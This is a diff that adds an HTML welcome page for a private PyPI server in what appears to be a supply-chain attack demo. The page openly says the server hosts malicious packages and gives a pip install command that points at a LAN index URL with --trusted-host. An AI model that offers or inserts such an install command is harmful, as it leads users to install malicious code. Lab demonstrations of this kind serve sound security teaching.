@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome to S04 PyPI Server!</title>
+    <style>
+        body { font-family: sans-serif; margin: 40px; line-height: 1.6; }
+        code { background-color: #f4f4f4; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
+        .command { background-color: #f4f4f4; padding: 15px; border-left: 4px solid #007acc; font-family: monospace; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to S04 Private PyPI Server!</h1>
+    <p>This is a custom PyPI compatible package index serving malicious packages for the S04 Supply Chain Demo.</p>
+    
+    <h3>To use this server with pip, run the following command:</h3>
+    <div class="command">
+        pip install PACKAGE_NAME --index-url http://192.168.157.134:8000/simple/ --trusted-host 192.168.157.134
+    </div>
+
+    <p>The complete list of all packages can be found <a href="/packages/">here</a> </p>
+    
+    <p>This instance is running version 2.4.1 of the <a href="https://github.com/pypiserver/pypiserver">pypiserver</a> software.</p>
+</body>
+</html>
